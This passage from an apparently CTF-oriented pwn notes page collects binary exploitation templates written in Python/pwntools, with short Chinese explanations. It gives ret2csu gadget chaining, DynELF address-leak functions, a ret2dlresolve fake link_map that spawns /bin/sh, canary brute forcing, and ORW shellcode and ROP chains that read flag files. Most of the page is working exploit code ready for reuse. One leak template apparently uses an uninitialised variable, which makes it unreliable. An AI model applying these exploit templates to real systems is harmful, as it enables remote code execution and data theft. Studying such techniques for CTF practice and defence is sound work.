<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr=</span><br><span class="line">csu_end_addr=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = padding + fake_ebp</span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure>
<p>​        // fun_got也可以是指向函数首地址的指针</p>
<p>例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, bss_addr, <span class="number">1</span>, main_addr)</span><br><span class="line"><span class="comment">#执行write(1,bss_addr,8)后，执行main_addr</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">8</span>, bss_addr, <span class="number">0</span>, main_addr)	</span><br><span class="line"><span class="comment">#执行read(0,bss_addr,8)后，执行main_addr</span></span><br></pre></td></tr></table></figure>
<p>​        //但是万能pop需要至少“136字节”（0x88）的溢出</p>
<h2 id="DynELF-基于puts的模板"><a href="#DynELF-基于puts的模板" class="headerlink" title="DynELF-基于puts的模板"></a>DynELF-基于puts的模板</h2><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数</p>
<p>所以想用puts来泄露地址，必须要对其进行处理：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(addr) </span><br><span class="line">    payload += p64(puts_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload) </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    count = <span class="number">0</span> </span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    up = <span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>) </span><br><span class="line">        count += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>: </span><br><span class="line">            data = data[:-<span class="number">1</span>] </span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            data += c </span><br><span class="line">        up = c </span><br><span class="line">    data = data[:<span class="number">8</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt) + p32(ret_address) + p32(address)</span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="built_in">print</span> p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = p.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p>
<p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p>
<h2 id="DynELF-基于write的模板"><a href="#DynELF-基于write的模板" class="headerlink" title="DynELF-基于write的模板"></a>DynELF-基于write的模板</h2><p>write比puts友好太多了，这个leak函数也比较简单：</p>
<p>64位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_ret) + p64(addr)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(<span class="number">8</span>)</span><br><span class="line">    payload += p64(write_plt) + p64(ret_address)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(addr,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>32位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = padding + fake_rbp</span><br><span class="line">    payload += p32(write_plt) + p32(ret_address) </span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">    data = p.recv(<span class="number">4</span>) </span><br><span class="line">    log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">function_libc = d.lookup(<span class="string">&#x27;function&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>配合上面的万能pop，还可以形成更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span> </span><br><span class="line">    csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, addr, <span class="number">1</span>, main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) </span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))) </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="comment">#当然，配合puts也是可以的（puts和write就只有接收部分不同）</span></span><br></pre></td></tr></table></figure>
<p>注意：有些程序自带循环，可以根据具体情况进行修改</p>
<h2 id="ret2dlresolve-64位"><a href="#ret2dlresolve-64位" class="headerlink" title="ret2dlresolve-64位"></a>ret2dlresolve-64位</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_Linkmap_payload</span>(<span class="params">fake_linkmap_addr,known_func_ptr,offset</span>):</span></span><br><span class="line">    linkmap = p64(offset &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>))</span><br><span class="line">    linkmap += p64(<span class="number">0</span>) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x18</span>)</span><br><span class="line">    linkmap += p64((fake_linkmap_addr + <span class="number">0x30</span> - offset) &amp; (<span class="number">2</span> ** <span class="number">64</span> - <span class="number">1</span>)) </span><br><span class="line">    linkmap += p64(<span class="number">0x7</span>) </span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(<span class="number">0</span>)</span><br><span class="line">    linkmap += p64(known_func_ptr - <span class="number">0x8</span>) </span><br><span class="line">    linkmap += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr) </span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x38</span>) </span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_linkmap_addr：可以控制的地址</span></span><br><span class="line"><span class="comment">#known_func_ptr：function_got（已知函数的GOT表地址）</span></span><br><span class="line"><span class="comment">#offset：system_got - function_got</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l_addr =  libc.sym[<span class="string">&#x27;system&#x27;</span>] -libc.sym[<span class="string">&#x27;function&#x27;</span>]  </span><br><span class="line">plt_load = addr(plt[<span class="number">1</span>]) <span class="comment"># dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line">fake_link_map = fake_Linkmap_payload(bss_stage, function_got ,l_addr)</span><br><span class="line">payload = flat( padding, pop_rdi, <span class="number">0</span>, pop_rsi, bss_stage, <span class="number">0</span>, read_plt, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, bss_stage + <span class="number">0x48</span>, plt_load, bss_stage, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># “bss_stage+0x48”为&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.send(fake_link_map) </span><br></pre></td></tr></table></figure>
<p>程序先利用read在“bss_stage”中写入了“fake_link_map”</p>
<p>在手动调用dl_runtime_resolve（plt_load），把“bss_stage”和“0”作为参数</p>
<p>执行完成之后，目标函数就会被重定位为“ system(“/bin/sh”) ”</p>
<p>理论上来讲，只要已知了libc版本就可以用这个来打</p>
<h2 id="canary爆破"><a href="#canary爆破" class="headerlink" title="canary爆破"></a>canary爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a:	<span class="comment">#一次性不覆盖全部的canary，而是覆盖1字节</span></span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">canary=<span class="string">&#x27;\x00&#x27;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br></pre></td></tr></table></figure>
<p>这两个’xxxx’写什么是关键，要对比“canary通过”和“canary不通过”程序输出的字符串来填入</p>
<h2 id="ORW（ROP链-shellcode）"><a href="#ORW（ROP链-shellcode）" class="headerlink" title="ORW（ROP链+shellcode）"></a>ORW（ROP链+shellcode）</h2><p><strong>ORW原理：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;gmp.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">	void* bss;</span><br><span class="line">	<span class="built_in">int</span>* fd,mm;</span><br><span class="line">	fd=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	mm=<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	bss=malloc(<span class="number">0x90</span>);</span><br><span class="line">	read(<span class="number">3</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	write(<span class="number">1</span>,bss,<span class="number">0x30</span>);</span><br><span class="line">	printf(<span class="string">&quot;fd &gt;&gt;%d\n&quot;</span>,fd);</span><br><span class="line">	printf(<span class="string">&quot;mm &gt;&gt;%d\n&quot;</span>,mm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的“read(3,bss,0x30)”（如果前面已经调用了“open”，可以换成“read(4,bss,0x30)”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ywhkkx&#125;</span><br><span class="line">fd &gt;&gt;<span class="number">3</span></span><br><span class="line">mm &gt;&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-32</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p><strong>Shellcode-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
<p>​        // 不管是64位还是32位：“esp”为“./flag”所在地址，根据具体情况进行填写</p>
<p><strong>ROP链-64</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">flag=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<p>当不知道程序名称时，用“getdents64”进行操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + fake_rbp</span><br><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># open(&quot;.&quot;)[3]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># getdents64(3, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">217</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(0, bss_addr, 0x30)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;.\x00&#x27;</span>) <span class="comment"># read(0, bss_addr, 2) &gt;&gt; open(&quot;.&quot;)</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>) <span class="comment"># read(0, bss_addr, 0x30) &gt;&gt; open(&#x27;xxxx&#x27;+flag_s,0)</span></span><br><span class="line">flag_s=p.recv(<span class="number">20</span>)</span><br><span class="line">flag=<span class="string">&#x27;xxxx&#x27;</span>+flag_s</span><br><span class="line">p.send(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>先用“open(“.”)”打开当前目录</li>
<li>使用“getdents64(3, bss_addr + 0x200, 0x600)”打印目录到“bss_addr + 0x200”</li>
<li>使用“write(1, bss_addr + 0x200, 0x600)”打印目录</li>
<li>选择性接受文件名称（至于怎么接收，就要看程序了）</li>
</ul>
